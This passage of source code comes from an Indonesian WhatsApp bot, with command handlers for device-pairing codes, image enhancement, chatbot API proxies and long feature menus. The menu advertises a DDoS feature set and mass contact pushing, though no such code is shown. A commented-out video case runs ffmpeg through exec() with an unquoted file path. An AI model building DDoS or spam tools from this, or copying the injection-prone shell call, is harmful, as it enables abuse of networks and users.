        case "jadibot-scan":
        if (!isPremium) return reply("*`Khusus Prem Saya kak`*")  
     if (m.isGroup) return reply("Maaf Kak Fitur Ini Hanya Bisa Di Gunakan Di Pribadi Chat")  
        await jadibots(ptz, m, frommeky)
        break
    case "xxc":
      ptz.sendMessage(m.sender, {text:'x'}, {quoted:fsaluran})
            if (frommeky.includes('-')) {
console.log('Pesan diterima dari grup');
            }
       break

    case "jadibot-pairing":
        if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
  if (!text) return reply("*Salah ! Seperti ini: .jadibot-pairing 628xxx*\nExample: .jadibot-pairing 6283123443245")
await jadibot(ptz, text, m, frommeky)
            let furry = "`"
            await sleep(4800)
let jadibo = `*${furry}Masukkan code dibawah ini untuk jadi bot sementara${furry}*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code di bawah ini\n\nNote: code dapat expired kapan saja!\n\nCode: ${furry}${global.codepairing}${furry}\nJika Code Error Silahkan Hapus Folder session2\n\nKlik Button Code pairing Untuk Menyalin Code`
let onlyprivjdb = '*Sukses !*'



let tekss9999 = jadibo;

let msghhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9999
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Defined Ziyoo`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"${global.codepairing}","id":"123456789","copy_code":"${global.codepairing}"}`
     },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(`${text}@s.whatsapp.net`, msghhhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhhh.key.id
});

setTimeout(async () => {
    reply(onlyprivjdb)
}, 1200)
        console.log('Jadibot •••')
        break
     case 'hd': case 'remini': {  if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
            let proses2 = proses
	 let hade = await remini(proses2, "enhance")
              
              
     ptz.sendMessage(m.chat, { image: hade, caption: '*Succes*\nVeemon Md • 2024'}, { quoted:fsaluran})
			}
			break  
        
       /* case 'hdvid': {
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidio nya mana?`);
  m.reply("wait..");
  const media = await ptz.downloadAndSaveMediaMessage(q);
  const url = await TelegraPH(media);
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.0:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    ptz.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });
  
            
}
break
 wm Faxx
https://whatsapp.com/channel/0029VaaZbDw3mFYCCtmjN81Y*/
        
        case "chatgpt":
   if (!text) return m.reply('mau nanya apa ke chatgpt')
var kolbekai = await fetchJson(`https://widipe.com/openai?text=Selalu Panggil saya ${pushname} Yak,${text}`)
			      var airespon = kolbekai.result
        setTimeout(async () => {
           let Fue = "`"
         await reply (`*${Fue}[ Chatgpt ] :${Fue}* ${airespon}`)
      }, 1000)
        break
   case "degreeguru":
        if (!text) return reply("Mau Nanya apa Ke dengreeguru")
 let isu = await fetchJson(`https://api.hyuunewbie.my.id/api/degreeguru?message=${text}`)
let gua = isu.data.response
reply(gua)
        break
        case "ragbot":
        if (!text) return reply('Mau nanya apa ke ragbot')
  let isurag = await fetchJson(`https://api.hyuunewbie.my.id/api/ragbot?message=${text}`)
let guaa = isurag.data.response
reply(guaa)  
        break
    case 'openai': case 'openaimon': case 'A-I': case "ai": case "openaimenu":
        let ain = "`"
        
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  A I - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  .ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ◦  .ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ◦  .ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ◦  .ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ◦  .ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  .ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  .ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  .ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ◦  .ꜱɪᴍɪ <on/off> 
│  ◦  .ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ◦  .ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ◦  .ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
│  ◦  .ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ◦  .ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ◦  .ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ◦  .ᴠᴇᴇᴍᴏɴ <on/off>
│  ◦  .ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ◦  .ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break

    case 'beton': case 'menu': case 'simplemenu': case 'menulist': case 'menumon':
 if (global.setmenu === "v1") {
let pedo = "`";

let teksskkk = `${tektek}`;
let sections = [{
		title: 'All simple Menu Bot', 
		rows: [{
	    title: 'A-I Menu List',
    	description: `<!> Display All Openai Feature •`, 
    	id: `${prefix}openaimon`
        },  
{
                   title: 'Voice Menu List',
                   description: "<!> Display All Voice Feature",
                   id: `${prefix}voicemon`
                   },
               {
                   title: 'Rpg Menu List',
                   description: "<!> Display All Rpg Feature",
                   id: `${prefix}rpgmon`
                   },
               {
                   title: 'Pushkontak Menu List',
                   description: "<!> Display All push Feature",
                   id: `${prefix}pushkontakmon`
                   },
               {
                   title: 'Group Menu List',
                   description: "<!> Display All Group Feature",
                   id: `${prefix}groupmon`
                   },
               {
                   title: 'Main Menu List',
                   description: "<!> Display All Main Feature",
                   id: `${prefix}mainmon`
                   },
               {
                   title: 'Tools Menu List',
                   description: "<!> Display All Tools Feature",
                   id: `${prefix}toolsmon`
                   },
               {
                   title: 'Ddos Menu List',
                   description: "<!> Display All Ddos Feature",
                   id: `${prefix}ddosmon`
                   },
               {
                   title: 'Photooxy Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Menu List',
                   description: "<!> Display All Ephoto Feature",
                   id: `${prefix}ephotomon`
                   },
               {
                   title: 'Sticker Menu List',
                   description: "<!> Display All Sticker Feature",
                   id: `${prefix}stickermon`
                   },
               {
                   title: 'Temporary Menu List',
                   description: "<!> Display All Temporary Feature",
                   id: `${prefix}tempormon`
                   },  
               {
                   title: 'Menu List',
                   description: "<!> Display All Simple Menu",
                   id: `${prefix}menumon`
                   },  
               {
                   title: 'Create Panel Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}panelmon`
                   },
               {
                   title: 'Digital Ocean List',
                   description: "<!> Display All D-o Feature",
                   id: `${prefix}domon`
                   },
               {
                   title: 'Linode Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}linodemon`
                   },
               {
                   title: 'All Menu List',
                   description: "<!> Display All Menu List",
                   id: `${prefix}allmon`
                   },  
               {
                   title: 'Photooxy Maker Menu List',
                   description: "<!> Display All Photooxy Feature",
                   id: `${prefix}photooxymon`
                   },
               {
                   title: 'Ephoto Maker Menu List',
                   description: "<!> Display All Panel Feature",
                   id: `${prefix}ephotomon`
                   },                   
               {
                   title: 'Jadibot Menu List',
                   description: "<!> Display All Jadibot Feature",
                   id: `${prefix}jadibotmon`
                   },
               {
                   title: 'Absen gc Menu List',
                   description: "<!> Display All Absen Feature",
                   id: `${prefix}absenmon`
                   },    
               {
                   title: 'Berita Menu List',
                   description: "<!> Display All Berita Feature",
                   id: `${prefix}beritamon`
                   },    
{
		title: 'Owner Menu List', 
		description: "<!> Display All Owner Feature •", 
		id: `${prefix}ownermon`
	    }]
}]

let listMessage = {
    title: 'List Menu Veemon',
    sections
};

let msghhhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m?.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '12036326753195844@newsletter',
                        newsletterName: `Veemon Md • ${runtime(process.uptime())}`,
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: ptz.decodeJid(ptz.user.id)
                    },
                    externalAdReply: {
                        title: '⟡V E E M O N • M U L T I • D E V I C E⟡',
                        body: "x ᴛʜᴇᴍᴇ ᴅɪɢɪ ᴇᴠᴏ - ᴠᴇʀ",
                        thumbnail: fs.readFileSync("./zio.jpg"),
                        sourceUrl: '',
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: teksskkk
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `© Ziyo Official`
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ``,
                    thumbnailUrl: "",
                    gifPlayback: true,
                    subtitle: "By Muhamad Zio Andrea",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                        document: fs.readFileSync('./package.json'),
                        mimetype: "application/msword",
                        jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: "Veemon MD - FDOC",
                     }, {
                        upload: ptz.waUploadToServer
                    }))
                }),
                gifPlayback: true,
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        "name": "single_select",
                        "buttonParamsJson": JSON.stringify(listMessage)
                    }]
                })
            })
        }
    }
}, {
    quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhh.key.remoteJid, msghhhhhhhhhhhhhhhhhhh.message, {
    messageId: msghhhhhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: 'Veemon MD - FDOC',
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: tektek,
contextInfo: {
forwardingScore: 10,
 isForwarded: true,
forwardedNewsletterMessageInfo: {
            newsletterJid: '120363294187887035@newsletter',
            serverMessageId: null,
            newsletterName: '- Vemon • Chanels -'
        },
externalAdReply: {
showAdAttribution: true,
title: '⟡V E E M O N • M U L T I • D E V I C E⟡',
body: `x ᴛʜᴇᴍᴇ ᴅɪɢɪ ᴇᴠᴏ - ᴠᴇʀ` ,
thumbnail: fs.readFileSync('./zio.jpg'),
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true 
}}}, {});
}
        break

 case 'allmon': case 'allmenu':
 let mnop0 = `${resver}
${readmore}╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  A I - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄʜᴀᴛɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  .ᴅᴇɢʀᴇᴇɢᴜʀᴜ <Qᴜᴇʀʏ>
│  ◦  .ʀᴀɢʙᴏᴛ <Qᴜᴇʀʏ>
│  ◦  .ꜱᴍᴀʀᴛ <Qᴜᴇʀʏ>
│  ◦  .ᴀɪ-ꜱᴇᴀʀᴄʜ <Qᴜᴇʀʏ>
│  ◦  .ᴛxᴛɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  .ᴛxᴛ2ɪᴍɢ <Qᴜᴇʀʏ>
│  ◦  .ᴘʀᴏᴍᴛ-ɢᴘᴛ <Qᴜᴇʀʏ>
│  ◦  .ɢᴘᴛɢᴏ <Qᴜᴇʀʏ>
│  ◦  .ꜱɪᴍɪ <on/off> 
│  ◦  .ᴅᴀʟʟᴇ <Qᴜᴇʀʏ>
│  ◦  .ʀᴇᴍɪɴɪ <ɪᴍᴀɢᴇ>
│  ◦  .ʙɪɴɢ-ᴀɪ <Qᴜᴇʀʏ>
│  ◦  .ʙʟᴀᴄᴋʙᴏx <Qᴜᴇʀʏ>
│  ◦  .ɴᴇᴠᴏ <Qᴜᴇʀʏ>
│  ◦  .ʟᴜᴍɪɴᴀ <Qᴜᴇʀʏ>
│  ◦  .ᴠᴇᴇᴍᴏɴ <on/off>
│  ◦  .ɢᴘᴛ4 <Qᴜᴇʀʏ>
│  ◦  .ᴅɪꜰꜰᴜꜱɪᴏɴ <Qᴜᴇʀʏ>
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  M A I N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴅɪꜱᴋ
│  ◦  .ᴘɪɴɢ
│  ◦  .ʀᴜɴᴛɪᴍᴇ
│  ◦  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S S N D - L I S T ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴀᴅ1
│  ◦  .ꜱᴀᴅ2
│  ◦  .ꜱᴀᴅ3
│  ◦  .ꜱᴀᴅ4
│  ◦  .ꜱᴀᴅ5
│  ◦  .ꜱᴀᴅ6
│  ◦  .ꜱᴀᴅ7
│  ◦  .ꜱᴀᴅ8
│  ◦  .ꜱᴀᴅ9
│  ◦  .ꜱᴀᴅ10
│  ◦  .ꜱᴀᴅ11
│  ◦  .ꜱᴀᴅ12
│  ◦  .ꜱᴀᴅ13
│  ◦  .ꜱᴀᴅ14
│  ◦  .ꜱᴀᴅ15
│  ◦  .ꜱᴀᴅ16
│  ◦  .ꜱᴀᴅ17
│  ◦  .ꜱᴀᴅ18
│  ◦  .ꜱᴀᴅ19
│  ◦  .ꜱᴀᴅ20
│  ◦  .ꜱᴀᴅ21
│  ◦  .ꜱᴀᴅ22
│  ◦  .ꜱᴀᴅ23
│  ◦  .ꜱᴀᴅ24
│  ◦  .ꜱᴀᴅ25
│  ◦  .ꜱᴀᴅ26
│  ◦  .ꜱᴀᴅ27
│  ◦  .ꜱᴀᴅ28
│  ◦  .ꜱᴀᴅ29
│  ◦  .ꜱᴀᴅ30
│  ◦  .ꜱᴀᴅ31
│  ◦  .ꜱᴀᴅ32
│  ◦  .ꜱᴀᴅ33
│  ◦  .ꜱᴀᴅ34
│  ◦  .ꜱᴀᴅ35
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  A B S E N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ʜᴀᴘᴜꜱᴀʙꜱᴇɴ
│  ◦  .ᴀʙꜱᴇɴ
│  ◦  .ᴄᴇᴋᴀʙꜱᴇɴ
│  ◦  .ᴍᴜʟᴀɪᴀʙꜱᴇɴ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  B R T A - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜰᴀᴊᴀʀ
│  ◦  .ᴄɴɴ
│  ◦  .ʟᴀʏᴀʀᴋᴀᴄᴀ
│  ◦  .ᴄɴʙᴄ
│  ◦  .ᴛʀɪʙᴜɴ
│  ◦  .ɪɴᴅᴏᴢᴏɴᴇ
│  ◦  .ᴋᴏᴍᴘᴀꜱ
│  ◦  .ᴅᴇᴛɪᴋɴᴇᴡꜱ
│  ◦  .ᴅᴀɪʟʏɴᴇᴡꜱ
│  ◦  .ɪɴᴇᴡꜱ
│  ◦  .ᴏᴋᴇᴢᴏɴᴇ
│  ◦  .ꜱɪɴᴅᴏ
│  ◦  .ᴛᴇᴍᴘᴏ
│  ◦  .ᴀɴᴛᴀʀᴀ
│  ◦  .ᴋᴏɴᴛᴀɴ
│  ◦  .ᴍᴇʀᴅᴇᴋᴀ
│  ◦  .ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
│  ◦  .ɢᴇᴍᴘᴀɴᴇᴡꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P H O X Y - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱʜᴀᴅᴏᴡ 
│  ◦  .ᴡʀɪᴛᴇ 
│  ◦  .ʀᴏᴍᴀɴᴛɪᴄ 
│  ◦  .ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ◦  .ꜱᴍᴏᴋᴇ 
│  ◦  .ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ◦  .ʟᴏᴠᴇ 
│  ◦  .ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ◦  .ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ◦  .ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ◦  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ◦  .ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ◦  .ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ◦  .ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ◦  .ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ◦  .ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ◦  .ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ◦  .ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ◦  .ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ◦  .ᴡʀɪᴛᴇᴀʀᴛ 
│  ◦  .ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ◦  .ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ◦  .ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ◦  .ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ◦  .ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ◦  .Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ◦  .ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  E P H T O - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ◦  .ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ◦  .ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ◦  .ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ◦  .ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ◦  .ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ◦  .ꜰʟᴀɢᴛᴇxᴛ 
│  ◦  .ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ◦  .ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ◦  .ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ◦  .ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ◦  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ◦  .ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ◦  .ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ◦  .ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ◦  .ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ◦  .ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ◦  .ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ◦  .ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ◦  .ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ◦  .ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ◦  .ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ◦  .ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ◦  .ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ◦  .1917ꜱᴛʏʟᴇ 
│  ◦  .ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ◦  .ʀᴏʏᴀʟᴛᴇxᴛ 
│  ◦  .ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ◦  .ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ◦  .ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  V O I C E - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ʙᴀꜱꜱ
│  ◦  .ʙʟᴏᴡɴ
│  ◦  .ᴅᴇᴇᴘ
│  ◦  .ᴇᴀʀʀᴀᴘᴇ
│  ◦  .ꜰᴀꜱᴛ
│  ◦  .ꜰᴀᴛ
│  ◦  .ɴɪɢʜᴛᴄᴏʀᴇ
│  ◦  .ʀᴇᴠᴇʀꜱᴇ
│  ◦  .ʀᴏʙᴏᴛ
│  ◦  .ꜱʟᴏᴡ
│  ◦  .ꜱᴍᴏᴏᴛʜ
│  ◦  .ᴛᴜᴘᴀɪ
│  ◦  .ꜱᴍᴏᴏᴛʜ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P N E L - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀᴅᴅᴜꜱʀ
│  ◦  .ᴀᴅᴅꜱʀᴠ
│  ◦  .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
│  ◦  .ᴅᴇʟᴜꜱʀ
│  ◦  .ᴅᴇʟꜱʀᴠ
│  ◦  .ᴅᴇᴛᴜꜱʀ
│  ◦  .ʟɪꜱᴛᴀᴅᴍɪɴ
│  ◦  .ʟɪꜱᴛᴜꜱʀ
│  ◦  .ʟɪꜱᴛꜱʀᴠ
│  ◦  .ʀᴇɪɴꜱᴛᴀʟʟ
│  ◦  .ʀᴇꜱᴛᴀʀᴛꜱʀᴠ
│  ◦  .ʀᴀᴍʟɪꜱᴛ
│  ◦  .ꜱᴘᴀɴᴇʟ
│  ◦  .ꜱᴛᴀʀᴛꜱʀᴠ
│  ◦  .ꜱᴛᴏᴘꜱʀᴠ
│  ◦  .ꜱᴜꜱᴘᴇɴᴅ
│  ◦  .ᴜɴꜱᴜꜱᴘᴇɴᴅ 
│  ◦  .ᴜᴘᴅᴀᴛᴇꜱʀᴠ
│  ◦  .ᴡᴇʙᴘᴀɴᴇʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  G R U P - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ◦  .ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ◦  .ᴇᴠᴇʀʏᴏɴᴇ 
│  ◦  .ᴛᴀɢᴀʟʟ
│  ◦  .ʜɪᴅᴇᴛᴀɢ
│  ◦  .ᴀɴᴛɪʟɪɴᴋ  <ꜱᴇʟᴇᴄᴛ>
│  ◦  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ◦  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ◦  .ᴡᴇʟᴄᴏᴍᴇ
│  ◦  .ꜱᴇᴛᴡᴇʟᴄᴏᴍᴇ
│  ◦  .ꜱᴇᴛɢᴏᴏᴅʙʏᴇ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P R V T - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ꜱᴛᴏᴘᴄᴏɴꜰᴇꜱꜱ
│  ◦  .ᴛᴏʟᴀᴋᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ʙᴀʟᴀꜱᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ʟᴀɴᴊᴜᴛᴀɴᴏɴʏ
│  ◦  .ꜱᴛᴀʀᴛᴀɴᴏɴʏ
│  ◦  .ᴀɴᴏɴʏᴍᴏᴜꜱᴄʜᴀᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S U N D- L I S T ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴏᴜɴᴅ1
│  ◦  .ꜱᴏᴜɴᴅ2
│  ◦  .ꜱᴏᴜɴᴅ3
│  ◦  .ꜱᴏᴜɴᴅ4
│  ◦  .ꜱᴏᴜɴᴅ5
│  ◦  .ꜱᴏᴜɴᴅ6
│  ◦  .ꜱᴏᴜɴᴅ7
│  ◦  .ꜱᴏᴜɴᴅ8
│  ◦  .ꜱᴏᴜɴᴅ9
│  ◦  .ꜱᴏᴜɴᴅ10
│  ◦  .ꜱᴏᴜɴᴅ11
│  ◦  .ꜱᴏᴜɴᴅ12
│  ◦  .ꜱᴏᴜɴᴅ13
│  ◦  .ꜱᴏᴜɴᴅ14
│  ◦  .ꜱᴏᴜɴᴅ15
│  ◦  .ꜱᴏᴜɴᴅ16
│  ◦  .ꜱᴏᴜɴᴅ17
│  ◦  .ꜱᴏᴜɴᴅ18
│  ◦  .ꜱᴏᴜɴᴅ18
│  ◦  .ꜱᴏᴜɴᴅ20
│  ◦  .ꜱᴏᴜɴᴅ21
│  ◦  .ꜱᴏᴜɴᴅ22
│  ◦  .ꜱᴏᴜɴᴅ23
│  ◦  .ꜱᴏᴜɴᴅ24
│  ◦  .ꜱᴏᴜɴᴅ25
│  ◦  .ꜱᴏᴜɴᴅ26
│  ◦  .ꜱᴏᴜɴᴅ27
│  ◦  .ꜱᴏᴜɴᴅ28
│  ◦  .ꜱᴏᴜɴᴅ29
│  ◦  .ꜱᴏᴜɴᴅ30
│  ◦  .ꜱᴏᴜɴᴅ31
│  ◦  .ꜱᴏᴜɴᴅ32
│  ◦  .ꜱᴏᴜɴᴅ33
│  ◦  .ꜱᴏᴜɴᴅ34
│  ◦  .ꜱᴏᴜɴᴅ35
│  ◦  .ꜱᴏᴜɴᴅ36
│  ◦  .ꜱᴏᴜɴᴅ37
│  ◦  .ꜱᴏᴜɴᴅ38
│  ◦  .ꜱᴏᴜɴᴅ39
│  ◦  .ꜱᴏᴜɴᴅ40
│  ◦  .ꜱᴏᴜɴᴅ41
│  ◦  .ꜱᴏᴜɴᴅ42
│  ◦  .ꜱᴏᴜɴᴅ43
│  ◦  .ꜱᴏᴜɴᴅ44
│  ◦  .ꜱᴏᴜɴᴅ45
│  ◦  .ꜱᴏᴜɴᴅ46
│  ◦  .ꜱᴏᴜɴᴅ47
│  ◦  .ꜱᴏᴜɴᴅ48
│  ◦  .ꜱᴏᴜɴᴅ49
│  ◦  .ꜱᴏᴜɴᴅ50
│  ◦  .ꜱᴏᴜɴᴅ51
│  ◦  .ꜱᴏᴜɴᴅ52
│  ◦  .ꜱᴏᴜɴᴅ53   
│  ◦  .ꜱᴏᴜɴᴅ54
│  ◦  .ꜱᴏᴜɴᴅ55
│  ◦  .ꜱᴏᴜɴᴅ56
│  ◦  .ꜱᴏᴜɴᴅ57
│  ◦  .ꜱᴏᴜɴᴅ58
